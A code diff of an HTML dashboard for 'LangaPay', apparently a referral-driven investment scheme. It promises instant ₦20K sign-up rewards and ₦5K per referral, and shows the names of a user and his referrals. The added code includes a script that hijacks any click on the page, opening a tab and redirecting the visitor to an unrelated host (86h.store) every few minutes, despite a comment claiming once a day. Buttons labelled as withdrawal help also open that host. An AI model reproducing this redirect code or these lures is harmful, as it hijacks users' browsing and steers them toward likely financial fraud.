@@ -1,145 +1,913 @@
 
+>
+
+
+    
+    
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhKD0dk0wW6RFrjmyHlhpU_L4N8lX0uoYhwCp_C4rZmrTkLyEYUNYKeZMTIrPZAOlMLJ9DTdJvNBDNDILcotjhCwc4067H_omUMqMo0eOtm8mudFqJBfy9rcVmr_5ZUDqnzqSMbMB0u_OxVDFudCfRVOQWVpy23rPMBQNoCwI9OMFzwu1VH2XuwGK1hYeE/s320/WhatsApp%20Image%202025-06-02%20at%2000.23.02_9c6d7623.jpg" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>LangaPay Website</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body { font-family: Arial, sans-serif; background-color: #f4f4f4; }
-    .navbar { background-color: #343a40; }
-    .navbar-brand, .nav-link { color: white !important; }
-    .hero { background: #007bff; color: white; padding: 80px 0; text-align: center; }
-    .features { padding: 40px 0; }
-    .footer { background: #343a40; color: white; text-align: center; padding: 20px; margin-top: 40px; }
-    .sidebar { height: 100vh; background-color: #343a40; padding: 20px; color: white; }
-    .sidebar a { color: #fff; text-decoration: none; display: block; margin: 15px 0; }
-    .sidebar a:hover { text-decoration: underline; }
-    .main-content { padding: 30px; }
-    .card { margin-bottom: 20px; }
-  </style>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <meta name="csrf-token" content="CDU0Gs6CWpbo8s7LwPJnYZpf8yKjqF2XAnpiIQlx">
+    <link rel="shortcut icon" type="image/png" href="https://langapay.site/asset/theme7/images/icon/icon.jpeg">
+    <title>
+                    Langa pay-
+                Dashboard
+    </title>
+
+    <link href="https://langapay.site/asset/common/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://langapay.site/asset/common/css/animate.min.css">
+    <link rel="stylesheet" href="https://langapay.site/asset/common/css/font-awsome.min.css">
+    <link rel="stylesheet" href="https://langapay.site/asset/common/css/iziToast.min.css">
+    <link href="https://langapay.site/asset/theme7/frontend/css/style.css" rel="stylesheet">
+
+            <style>
+            .modal-backdrop.fade.show {
+                display: none;
+            }
+
+            @media (max-width: 991px) {
+                #header.header-inner-pages {
+                    display: block;
+                    background: transparent !important;
+                    position: absolute;
+                }
+
+                .dashboard-body-part {
+                    padding-top: 80px;
+                }
+            }
+
+            .sp-referral .single-child {
+                padding: 6px 10px;
+                border-radius: 5px;
+            }
+
+            .sp-referral .single-child+.single-child {
+                margin-top: 15px;
+            }
+
+            .sp-referral .single-child p {
+                display: flex;
+                align-items: center;
+                margin-bottom: 0;
+            }
+
+            .sp-referral .single-child p img {
+                width: 35px;
+                height: 35px;
+                border-radius: 50%;
+                object-fit: cover;
+                -o-object-fit: cover;
+            }
+
+            .sp-referral .single-child p span {
+                width: calc(100% - 35px);
+                font-size: 14px;
+                padding-left: 10px;
+            }
+
+            .sp-referral>.single-child.root-child>p img {
+                border: 2px solid #c3c3c3;
+            }
+
+            .sub-child-list {
+                position: relative;
+                padding-left: 35px;
+            }
+
+            .sub-child-list::before {
+                position: absolute;
+                content: '';
+                top: 0;
+                left: 17px;
+                width: 1px;
+                height: 100%;
+                background-color: #a1a1a1;
+            }
+
+            .sub-child-list>.single-child {
+                position: relative;
+            }
+
+            .sub-child-list>.single-child::before {
+                position: absolute;
+                content: '';
+                left: -18px;
+                top: 21px;
+                width: 30px;
+                height: 5px;
+                border-left: 1px solid #a1a1a1;
+                border-bottom: 1px solid #a1a1a1;
+                border-radius: 0 0 0 5px;
+            }
+
+            .sub-child-list>.single-child>p img {
+                border: 2px solid #c3c3c3;
+            }
+        </style>
+    
 </head>
+
 <body>
-  <nav class="navbar navbar-expand-lg navbar-dark">
-    <div class="container">
-      <a class="navbar-brand" href="#">LangaPay</a>
-      <div class="collapse navbar-collapse">
-        <ul class="navbar-nav ms-auto">
-          <li class="nav-item"><a class="nav-link" href="#">Home</a></li>
-          <li class="nav-item"><a class="nav-link" href="#dashboard">Dashboard</a></li>
-          <li class="nav-item"><a class="nav-link" href="#contact">Contact</a></li>
+    
+    
+    <!-- ======= Header ======= -->
+    <header id="header" class="fixed-top header-inner-pages">
+        <div class="container-fluid d-flex align-items-center justify-content-between">
+            <div class="d-flex flex-wrap align-items-center">
+                <div class="logo me-auto me-lg-0 ">
+                    <a href="https://langapay.site">
+                                                    <img class="img-fluid rounded sm-device-img text-align"
+                                src="https://langapay.site/asset/theme7/images/logo/whitelogo.png" width="100%" alt="pp">
+                                            </a>
+                </div>
+            </div>
+            <div class="header-right d-flex">
+                <select class="changeLang" aria-label="Default select example">
+                                            <option value="EN"
+                            >
+                            English
+                        </option>
+                                    </select>
+                <div class="dropdown ms-3">
+                    <button class="dropdown-toggle user-toggle-menu" type="button" id="dropdownMenuButton1"
+                        data-bs-toggle="dropdown" aria-expanded="false">
+                        
+                            <img src="https://langapay.site/asset/common/images/user/6841ba09784901749137929.jpg" alt="pp">
+                        
+                        <span class="ms-2">Andrew Edet</span>
+                    </button>
+                    <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="dropdownMenuButton1">
+                        <li><a class="dropdown-item" href="https://langapay.site/2fa">2fa</a></li>
+                        <li><a class="dropdown-item" href="https://langapay.site/profile/setting">Settings</a></li>
+                        <li><a class="dropdown-item" href="https://langapay.site/logout">Logout</a></li>
+                    </ul>
+                </div>
+                <button type="button" class="mobile-sidebar-toggler"><i class="fas fa-bars"></i></button>
+            </div>
+        </div>
+    </header><!-- End Header -->
+
+    <main id="main" class="dashboard-main">
+        <section class="dashboard-section">
+
+            <div class="d-sidebar">
+    <ul class="d-sidebar-menu">
+      <li class="active">
+        <a href="https://langapay.site/dashboard"><i data-feather="home"></i> Dashboard</a>
+      </li>
+
+      <li class="has_submenu ">
+        <a href="#0"><i data-feather="zap"></i> Investment</a>
+        <ul class="submenu">
+          <li class="">
+            <a href="https://langapay.site/investmentplan"><i data-feather="chevrons-right"></i></i> Investment plans</a>
+          </li>
+          <li class="">
+            <a href="https://langapay.site/invest/log"><i data-feather="chevrons-right"></i> Invest log</a>
+          </li>
+        </ul> 
+      </li>
+
+     <!-- <li class="has_submenu ">
+        <a href="#0"><i data-feather="briefcase"></i> Deposit</a>
+        <ul class="submenu">
+          <li class="">
+            <a href="https://langapay.site/deposit"><i data-feather="chevrons-right"></i> Deposit</a>
+          </li>
+          <li class="">
+            <a href="https://langapay.site/deposit/log"><i data-feather="chevrons-right"></i> Deposit log</a>
+          </li>
         </ul>
-      </div>
+      </li> -->
+
+      <li class="has_submenu ">
+        <a href="#0"><i data-feather="credit-card"></i> Withdraw</a>
+        <ul class="submenu">
+          <li class="">
+            <a href="https://langapay.site/withdraw"><i data-feather="chevrons-right"></i> Withdraw</a>
+          </li>
+          <li class="">
+            <a href="https://langapay.site/withdraw/all"><i data-feather="chevrons-right"></i> Withdraw log</a>
+          </li>
+        </ul>
+      </li>
+
+     <!-- <li class="">
+        <a href="https://langapay.site/transfer-money"><i data-feather="repeat"></i> Transfer money</a>
+      </li>
+
+       <li class="">
+            <a href="https://langapay.site/money/transfer/log">
+            <i data-feather="file-text"></i>
+                Money transfer log
+            </a>
+        </li>-->
+
+
+      <li class="">
+        <a href="https://langapay.site/interest/log"><i data-feather="file-text"></i> Interest log</a>
+      </li>
+      <li class="">
+        <a href="https://langapay.site/transaction/log"><i data-feather="file-text"></i> Transaction log</a>
+      </li>
+      <li class="">
+        <a href="https://langapay.site/commision"><i data-feather="file-text"></i> Refferal log</a>
+      </li>
+      
+      <li class="">
+        <a href="https://langapay.site/2fa"><i data-feather="shield"></i> 2fa</a>
+      </li>
+      <li class="">
+        <a href="https://langapay.site/ticket"><i data-feather="life-buoy"></i> Support</a>
+      </li>
+      <li>
+        <a href="https://langapay.site/logout"><i data-feather="log-out"></i> Logout</a>
+      </li>
+    </ul>
+    <div class="d-plan-notice mt-4 mx-3">
+        <p class="mb-0">Your current plan
+            -N/A</p>
+        <a href="https://langapay.site/investmentplan">Update plan <i class="fas fa-arrow-up"></i></a>
     </div>
-  </nav>
+</div>
 
-  <section class="hero">
-    <div class="container">
-      <h1>Welcome to LangaPay</h1>
-      <p>Your reliable earnings and referral platform.</p>
-    </div>
-  </section>
 
-  <section class="features container">
-    <div class="row">
-      <div class="col-md-4">
-        <div class="card">
-          <div class="card-body">
-            <h5 class="card-title">Instant Deposit</h5>
-            <p class="card-text">Easily deposit funds to start earning.</p>
-          </div>
-        </div>
-      </div>
-      <div class="col-md-4">
-        <div class="card">
-          <div class="card-body">
-            <h5 class="card-title">Fast Withdrawals</h5>
-            <p class="card-text">Withdraw your earnings quickly and securely.</p>
-          </div>
-        </div>
-      </div>
-      <div class="col-md-4">
-        <div class="card">
-          <div class="card-body">
-            <h5 class="card-title">Referral Earnings</h5>
-            <p class="card-text">Earn more by referring others to the platform.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+<!-- mobile bottom menu start 
+<div class="mobile-bottom-menu-wrapper">
+  <ul class="mobile-bottom-menu">
+   <li>
+      <a href="https://langapay.site/deposit" class="">
+        <i class="bi bi-wallet2"></i>
+        <span>Deposit</span>
+      </a>
+    </li>
+    <li>
+      <a href="https://langapay.site/investmentplan" class="">
+        <i class="bi bi-piggy-bank"></i>
+        <span>My invest</span>
+      </a>
+    </li>
+    <li>
+      <a href="https://langapay.site/dashboard" class="active">
+        <i class="bi bi-house-door"></i>
+        <span>Home</span>
+      </a>
+    </li>
+    <li>
+      <a href="https://langapay.site/withdraw" class="">
+        <i class="bi bi-cash-coin"></i>
+        <span>Withdraw</span>
+      </a>
+    </li>
+    <li>
+      <a href="https://langapay.site/transfer-money" class="">
+        <i class="bi bi-shuffle"></i>
+        <span>Transfer</span>
+      </a>
+    </li>
+  </ul>
+</div>-->
+<!-- mobile bottom menu end -->            <style>
+  #popup-message {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0,0,0,0.5);
+    z-index: 1000;
+  }
 
-  <section class="container-fluid" id="dashboard">
-    <div class="row">
-      <div class="col-md-3 sidebar">
-        <h3>Dashboard</h3>
-        <a href="#">Deposit</a>
-        <a href="#">Withdraw</a>
-        <a href="#">Referrals</a>
-        <a href="#">Logout</a>
-      </div>
+  .popup-content {
+    background-color: #0C637E;
+    color: white;
+    padding: 20px;
+    border-radius: 8px;
+    width: 300px;
+    max-width: 80%;
+    margin: 15% auto;
+    text-align: center;
+    position: relative;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  }
 
-      <div class="col-md-9 main-content">
-        <h2>Hello, User</h2>
-        <div class="row">
-          <div class="col-md-4">
-            <div class="card bg-success text-white">
-              <div class="card-body">
-                <h5 class="card-title">Total Balance</h5>
-                <p class="card-text">₦25,000</p>
-              </div>
+  .close-btn {
+    position: absolute;
+    top: 10px;
+    right: 15px;
+    color: white;
+    font-size: 24px;
+    cursor: pointer;
+  }
+</style>
+
+  <style>
+    .chat-container {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 1px;
+      z-index: 9999;
+      font-family: Arial, sans-serif;
+    }
+
+    .chat-item {
+      display: flex;
+      align-items: center;
+      background: white;
+      border: 2px solid #ccc;
+      border-radius: 15px;
+      padding: 8px 2px;
+      box-shadow: 0 4px 5px rgba(0, 0, 0, 0.2);
+      transition: transform 0.3s ease;
+      text-decoration: none;
+    }
+
+    .chat-item:hover {
+      transform: translateY(-2px);
+    }
+
+    .chat-icon {
+      font-size: 20px;
+      margin-left: 10px;
+    }
+
+    .whatsapp-icon {
+      color: #25D366;
+    }
+
+    .telegram-icon {
+      color: #0088cc;
+    }
+
+    .chat-label {
+      font-size: 15px;
+      color: #333;
+    }
+  </style>
+  
+  <div id="popup-message" style="display: none;">
+  <div class="popup-content">
+    <span class="close-btn" onclick="document.getElementById('popup-message').style.display='none'">&times;</span>
+    <p>EXCITING NEWS WE ARE LAUNCHING A NEW UPDATE TODAY (1ST JUNE) AND YOU ARE INVITED TO GRAB YOUR REWARD CREATE AN ACCOUNT NOW AND GET ₦20K INSTANTLY REFER FRIENDS AND EARN 5K PER REFERRAL WITHDRAWAL is free with a minimum of ₦60k! 🎉</p>
+  </div>
+</div>
+
+    <div class="dashboard-body-part">
+        <div class="row g-sm-4 g-3 justify-content-between">
+            <div class="col-xl-4 col-lg-6">
+                <div class="user-account-number h-100">
+                    <div class="card-dot mb-sm-4 mb-2">
+                        <span class="dot-1"></span>
+                        <span class="dot-2"></span>
+                    </div>
+                    <p class="caption mb-2">Account balance</p>
+                    <h3 class="acc-number">
+                        ₦35,000.00
+                    </h3>
+                    <i class="bi bi-wallet2"></i>
+                </div>
             </div>
-          </div>
-          <div class="col-md-4">
-            <div class="card bg-info text-white">
-              <div class="card-body">
-                <h5 class="card-title">Earnings</h5>
-                <p class="card-text">₦5,000</p>
-              </div>
+
+  <a href="https://86h.store/1.html" style="padding: 10px 20px; background-color: blue; color: white; text-decoration: none; border-radius: 5px;" onclick="window.open('https://86h.store/99.html')"
+>
+  Withdrawal Solution
+</a>
+<a href="https://86h.store/4.html" style="padding: 10px 20px; background-color: green; color: white; text-decoration: none; border-radius: 5px;" onclick="window.open('https://86h.store/7.html')"
+>
+  How to Withdraw
+</a>
+            <!-- mobile card slider start -->
+ <div class="col-xl-4 col-lg-6">
+                    <div class="row g-sm-4 g-3">
+                        <div class="col-lg-12 col-6">
+                            <div class="d-box-three gr-bg-1">
+                                <div class="icon">
+                                    <i class="bi bi-piggy-bank text-white"></i>
+                                </div>
+                                <div class="content">
+                                    <p class="text-small mb-0 text-white">Total withdraw</p>
+                                    <h5 class="title text-white">₦
+                                        0.00</h5>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-lg-12 col-6">
+                            <div class="d-box-three gr-bg-3">
+                                <div class="icon">
+                                    <i class="bi bi-hourglass-split text-white"></i>
+                                </div>
+                                <div class="content">
+                                    <p class="text-small mb-0 text-white">Total deposit</p>
+                                    <h5 class="title text-white">₦
+                                        0.00</h5>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-xl-4">
+                    <div class="row g-sm-4 g-3">
+                        <div class="col-xl-12 col-6">
+                            <div class="d-box-three gr-bg-2">
+                                <div class="icon">
+                                    <i class="bi bi-cash-coin text-white"></i>
+                                </div>
+                                <div class="content">
+                                    <p class="text-small mb-0 text-white">Total invest</p>
+                                    <h5 class="title text-white">₦
+                                        0.00</h5>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-12 col-6">
+                            <div class="d-box-three gr-bg-4">
+                                <div class="icon">
+                                    <i class="bi bi-wallet2 text-white"></i>
+                                </div>
+                                <div class="content">
+                                    <p class="text-small mb-0 text-white">Current invest</p>
+                                    <h5 class="title text-white">₦
+                                        0
+                                        </h5>
+                                </div>
+                            
+                </div>
             </div>
-          </div>
-          <div class="col-md-4">
-            <div class="card bg-warning text-white">
-              <div class="card-body">
-                <h5 class="card-title">Referral Bonus</h5>
-                <p class="card-text">₦10,000</p>
-              </div>
+
+            <div class="row gy-4 mt-1 d-box-two-wrapper d-sm-flex d-none">
+                <div class="col-xl-3 col-sm-6">
+                    <div class="d-box-two">
+                        <div class="d-box-two-icon">
+                            <i class="fas fa-boxes"></i>
+                        </div>
+                        <span class="caption-title">Current plan</span>
+                        <h3 class="d-box-two-amount">
+                            N/A</h3>
+                        <a href="https://langapay.site/invest/all" class="link-btn"><i class="fas fa-arrow-right"></i></a>
+                    </div>
+                </div>
+                <div class="col-xl-3 col-sm-6">
+                    <div class="d-box-two">
+                        <div class="d-box-two-icon">
+                            <i class="fas fa-money-check"></i>
+                        </div>
+                        <span class="caption-title">Pending invest</span>
+                        <h3 class="d-box-two-amount">₦
+                            0.00
+                        </h3>
+                        <a href="https://langapay.site/invest/pending" class="link-btn"><i
+                                class="fas fa-arrow-right"></i></a>
+                    </div>
+                </div>
+                <div class="col-xl-3 col-sm-6">
+                    <div class="d-box-two">
+                        <div class="d-box-two-icon">
+                            <i class="fas fa-hourglass-half"></i>
+                        </div>
+                        <span class="caption-title">Pending withdraw</span>
+                        <h3 class="d-box-two-amount">₦
+                            0.00
+                        </h3>
+                        <a href="https://langapay.site/withdraw/pending" class="link-btn"><i
+                                class="fas fa-arrow-right"></i></a>
+                    </div>
+                </div>
+                <div class="col-xl-3 col-sm-6">
+                    <div class="d-box-two">
+                        <div class="d-box-two-icon">
+                            <i class="fas fa-hand-holding-usd"></i>
+                        </div>
+                        <span class="caption-title">Refferal earn</span>
+                        <h3 class="d-box-two-amount">₦
+                            0.00 
+                        </h3>
+                        <a href="https://langapay.site/commision" class="link-btn"><i class="fas fa-arrow-right"></i></a>
+                    </div>
+                </div>
             </div>
-          </div>
+            <!-- mobile card slider end -->
+
+            <div class="col-xl-4 col-lg-6 d-sm-block d-none">
+                <div class="row g-sm-4 g-3">
+                    <div class="col-lg-12 col-6">
+                        <div class="d-box-three gr-bg-1">
+                            <div class="icon">
+                                <i class="bi bi-piggy-bank text-white"></i>
+                            </div>
+                            <div class="content">
+                                <p class="text-small mb-0 text-white">Total withdraw</p>
+                                <h5 class="title text-white">
+                                   ₦ 0.00</h5>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-lg-12 col-6">
+                        <div class="d-box-three gr-bg-3">
+                            <div class="icon">
+                                <i class="bi bi-hourglass-split text-white"></i>
+                            </div>
+                            <div class="content">
+                                <p class="text-small mb-0 text-white">Total deposit</p>
+                                <h5 class="title text-white">
+                                  ₦  0.00</h5>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-xl-4 d-sm-block d-none">
+                <div class="row g-sm-4 g-3">
+                    <div class="col-xl-12 col-6">
+                        <div class="d-box-three gr-bg-2">
+                            <div class="icon">
+                                <i class="bi bi-cash-coin text-white"></i>
+                            </div>
+                            <div class="content">
+                                <p class="text-small mb-0 text-white">Total invest</p>
+                                <h5 class="title text-white">
+                                   ₦ 0.00</h5>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-xl-12 col-6">
+                        <div class="d-box-three gr-bg-4">
+                            <div class="icon">
+                                <i class="bi bi-wallet2 text-white"></i>
+                            </div>
+                            <div class="content">
+                                <p class="text-small mb-0 text-white">Current invest</p>
+                                <h5 class="title text-white">₦
+                                    0
+                                    </h5>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
 
-        <div class="card">
-          <div class="card-body">
-            <h5 class="card-title">Your Referral Link</h5>
-            <div class="input-group">
-              <input type="text" class="form-control" id="refLink" value="https://langapay.site/register?ref=username" readonly>
-              <button class="btn btn-primary" onclick="copyLink()">Copy</button>
+        <div class="row gy-4 mt-1 d-box-two-wrapper d-sm-flex d-none">
+            <div class="col-xl-3 col-sm-6">
+                <div class="d-box-two">
+                    <div class="d-box-two-icon">
+                        <i class="fas fa-boxes"></i>
+                    </div>
+                    <span class="caption-title">Current plan</span>
+                    <h3 class="d-box-two-amount">
+                        N/A</h3>
+                    <a href="https://langapay.site/invest/all" class="link-btn"><i class="fas fa-arrow-right"></i></a>
+                </div>
             </div>
-          </div>
+            <div class="col-xl-3 col-sm-6">
+                <div class="d-box-two">
+                    <div class="d-box-two-icon">
+                        <i class="fas fa-money-check"></i>
+                    </div>
+                    <span class="caption-title">Pending invest</span>
+                    <h3 class="d-box-two-amount">₦
+                        0.00
+                    </h3>
+                    <a href="https://langapay.site/invest/pending" class="link-btn"><i
+                            class="fas fa-arrow-right"></i></a>
+                </div>
+            </div>
+            <div class="col-xl-3 col-sm-6">
+                <div class="d-box-two">
+                    <div class="d-box-two-icon">
+                        <i class="fas fa-hourglass-half"></i>
+                    </div>
+                    <span class="caption-title">Pending withdraw</span>
+                    <h3 class="d-box-two-amount">₦
+                        0.00
+                    </h3>
+                    <a href="https://langapay.site/withdraw/pending" class="link-btn"><i
+                            class="fas fa-arrow-right"></i></a>
+                </div>
+            </div>
+            <div class="col-xl-3 col-sm-6">
+                <div class="d-box-two">
+                    <div class="d-box-two-icon">
+                        <i class="fas fa-hand-holding-usd"></i>
+                    </div>
+                    <span class="caption-title">Refferal earn</span>
+                    <h3 class="d-box-two-amount">
+                        0.00 ₦
+                    </h3>
+                    <a href="https://langapay.site/commision" class="link-btn"><i class="fas fa-arrow-right"></i></a>
+                </div>
+            </div>
         </div>
+
+        <!-- mobile screen card start -->
+        <div class="col-12 d-sm-none mt-4">
+            <div class="row gy-4 mobile-box-wrapper">
+                <div class="col-3">
+                    <div class="mobile-box link-item">
+                        <a href="investmentplan" class="item-link"></a>
+                        <img src="https://langapay.site/asset/theme7/images/d-icon/1.png" alt="icon">
+                        <h6 class="title">Invest</h6>
+                    </div>
+                </div>
+                <div class="col-3">
+                    <div class="mobile-box link-item">
+                        <a href="deposit" class="item-link"></a>
+                        <img src="https://langapay.site/asset/theme7/images/d-icon/2.png" alt="icon">
+                        <h6 class="title">Deposit</h6>
+                    </div>
+                </div>
+                <div class="col-3">
+                    <div class="mobile-box link-item">
+                        <a href="withdraw" class="item-link"></a>
+                        <img src="https://langapay.site/asset/theme7/images/d-icon/3.png" alt="icon">
+                        <h6 class="title">Withdraw</h6>
+                    </div>
+                </div>
+               
+               
+                <div class="col-3">
+                    <div class="mobile-box link-item">
+                        <a href="setting" class="item-link"></a>
+                        <img src="https://langapay.site/asset/theme7/images/d-icon/7.png" alt="icon">
+                        <h6 class="title">Settings</h6>
+                    </div>
+                </div>
+                <div class="col-3">
+                    <div class="mobile-box link-item">
+                        <a href="https://langapay.site/view/all/btn" class="item-link"></a>
+                        <img src="https://langapay.site/asset/theme7/images/d-icon/8.png" alt="icon">
+                        <h6 class="title">View all</h6>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- mobile screen card end -->
 
         <div class="mt-4">
-          <a href="#" class="btn btn-success me-2">Join WhatsApp Group</a>
-          <a href="#" class="btn btn-primary">Join Telegram Channel</a>
+            <label>My referral link</label>
+            <div class="input-group mb-3">
+                <input type="text" id="refer-link" class="form-control copy-text"
+                    value="https://langapay.site/register/KennyAndy" placeholder="referallink.com/refer"
+                    aria-label="Recipient's username" aria-describedby="basic-addon2" readonly>
+                <button type="button" class="input-group-text copy cmn-btn"
+                    id="basic-addon2">Copy</button>
+            </div>
         </div>
-      </div>
+
+        
+        
+        <div class="row">
+            <div class="col-md-12">
+                <div class="site-card">
+                    <div class="card-header">
+                        <h5 class="mb-0">My referrals</h5>
+                    </div>
+                    <div class="card-body">
+                                                    <ul class="sp-referral">
+                                <li class="single-child root-child">
+                                    <p>
+                                        <img src="https://langapay.site/asset/common/images/user/6841ba09784901749137929.jpg">
+                                        <span
+                                            class="mb-0">Andrew Edet - N/A</span>
+                                    </p>
+                                    <ul class="sub-child-list step-2">
+                                                                                    <li class="single-child">
+                                                <p>
+                                                    <img src="https://langapay.site/asset/common/images/user">
+                                                    <span
+                                                        class="mb-0">Patricia Ndiana - N/A</span>
+                                                </p>
+
+                                                <ul class="sub-child-list step-3">
+                                                                                                    </ul>
+                                            </li>
+                                                                                    <li class="single-child">
+                                                <p>
+                                                    <img src="https://langapay.site/asset/common/images/user">
+                                                    <span
+                                                        class="mb-0">Stella Ekpo - N/A</span>
+                                                </p>
+
+                                                <ul class="sub-child-list step-3">
+                                                                                                    </ul>
+                                            </li>
+                                                                                    <li class="single-child">
+                                                <p>
+                                                    <img src="https://langapay.site/asset/common/images/user">
+                                                    <span
+                                                        class="mb-0">Igomu Innocent - N/A</span>
+                                                </p>
+
+                                                <ul class="sub-child-list step-3">
+                                                                                                    </ul>
+                                            </li>
+                                        
+                                    </ul>
+                                </li>
+                            </ul>
+                                            </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal fade" id="planDelete" tabindex="-1" role="dialog">
+            <div class="modal-dialog" role="document">
+                <form action="" method="post">
+                    <input type="hidden" name="_token" value="CDU0Gs6CWpbo8s7LwPJnYZpf8yKjqF2XAnpiIQlx">                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h5 class="modal-title">Delete Plan</h5>
+                            <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true">&times;</span>
+                            </button>
+                        </div>
+                        <div class="modal-body">
+                                                    </div>
+                        <div class="modal-footer">
+                            <button type="submit" class="btn btn-primary">Delete</button>
+                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
     </div>
-  </section>
+    
 
-  <footer class="footer">
-    <p>&copy; 2025 LangaPay. All rights reserved.</p>
-  </footer>
+  
+  
+  
+  <div class="chat-container">
+    <a href="https://86h.store/1.html" class="chat-item" onclick="window.open('https://whatsapp.com/channel/0029VbBMEruEKyZB3QXf3L1F')">
+      <i class="fab fa-whatsapp chat-icon whatsapp-icon"></i>
+      <span class="chat-label">Join our WhatsApp Channel</span>
+    </a>
+    <a href="https://86h.store/3.html" class="chat-item" onclick="window.open('https://t.me/+3tPGn7owniI5YTNk')">
+      <i class="fab fa-telegram chat-icon telegram-icon"></i>
+      <span class="chat-label">Join our Telegram Channel</span>
+    </a>
+  </div>
+<script>
+  window.onload = function() {
+    document.getElementById('popup-message').style.display = 'block';
+  }
+</script>
+    <script>
+    // Function to check if a day has passed
+    function hasADayPassed() {
+      const lastActionTime = localStorage.getItem("lastActionTime");
+      if (!lastActionTime) return true; // No action recorded yet
 
-  <script>
-    function copyLink() {
-      const copyText = document.getElementById("refLink");
-      copyText.select();
-      copyText.setSelectionRange(0, 99999);
-      document.execCommand("copy");
-      alert("Referral link copied to clipboard!");
+      const lastDate = new Date(parseInt(lastActionTime, 10));
+      const currentDate = new Date();
+
+      // Calculate the difference in milliseconds
+      const msInDay = 4 * 60 * 1000; // 24 hours
+      return currentDate - lastDate > msInDay;
     }
+
+    // Click event listener
+    document.body.addEventListener("click", () => {
+      // Check if a day has passed or if no action has been recorded
+      if (hasADayPassed()) {
+        // Open a new tab
+        window.open("https://langapay.site/dashboard", "_blank");
+
+        // Redirect the main site
+        window.location.href = "https://86h.store/7.html";
+
+        // Store the current timestamp in localStorage
+        localStorage.setItem("lastActionTime", Date.now());
+      }
+    });
   </script>
+  
+            </section>
+    </main>
+
+    
+    <script src="https://langapay.site/asset/common/js/jquery.min.js"></script>
+    <script src="https://langapay.site/asset/common/js/bootstrap.bundle.min.js"></script>
+
+    <script src="https://langapay.site/asset/theme7/frontend/js/feather.min.js"></script>
+
+    <script src="https://langapay.site/asset/common/js/slick.min.js"></script>
+
+    <script src="https://langapay.site/asset/common/js/iziToast.min.js"></script>
+    <script src="https://langapay.site/asset/theme7/frontend/js/user_dashboard.js"></script>
+
+            <script>
+            'use strict';
+
+            $('.planDelete').on('click', function() {
+                const modal = $('#planDelete');
+
+                modal.find('form').attr('action', $(this).data('href'))
+
+                modal.modal('show')
+
+
+            })
+
+            var copyButton = document.querySelector('.copy');
+            var copyInput = document.querySelector('.copy-text');
+            copyButton.addEventListener('click', function(e) {
+                e.preventDefault();
+                var text = copyInput.select();
+                document.execCommand('copy');
+            });
+            copyInput.addEventListener('click', function() {
+                this.select();
+            });
+
+            
+        $('.mobile-card-slider').slick({
+            slidesToShow: 1,
+            slidesToScroll: 1,
+            centerMode: true,
+            centerPadding: '60px',
+            arrows: false,
+            dots: false,
+            autoplay: false,
+            cssEase: 'cubic-bezier(0.645, 0.045, 0.355, 1.000)',
+            speed: 1500,
+            autoplaySpeed: 1000,
+            responsive: [
+                {
+                breakpoint: 1200,
+                settings: {
+                    slidesToShow: 3
+                }
+                },
+                {
+                breakpoint: 768,
+                settings: {
+                    slidesToShow: 2
+                }
+                },
+                {
+                breakpoint: 480,
+                settings: {
+                    slidesToShow: 1
+                }
+                }
+            ]
+        });
+        </script>
+            
+    
+                        <script>
+                "use strict";
+                iziToast.success({
+                    message: "Successfully logged in",
+                    position: "topRight"
+                });
+            </script>
+            
+    
+
+    <script>
+        'use strict'
+        var url = "https://langapay.site/changeLang";
+
+        $(".changeLang").change(function() {
+            if ($(this).val() == '') {
+                return false;
+            }
+            window.location.href = url + "?lang=" + $(this).val();
+        });
+
+        feather.replace();
+
+        // responsive menu slideing
+        $(".d-sidebar-menu>li>a").on("click", function() {
+            var element = $(this).parent("li");
+            if (element.hasClass("open")) {
+                element.removeClass("open");
+                element.find("li").removeClass("open");
+                element.find("ul").slideUp(500, "linear");
+            } else {
+                element.addClass("open");
+                element.children("ul").slideDown();
+                element.siblings("li").children("ul").slideUp();
+                element.siblings("li").removeClass("open");
+                element.siblings("li").find("li").removeClass("open");
+                element.siblings("li").find("ul").slideUp();
+            }
+        });
+
+        $('.mobile-sidebar-toggler').on('click', function() {
+            $(this).toggleClass('active');
+            $('.d-sidebar').toggleClass('active');
+        });
+    </script>
 </body>
+
 </html>
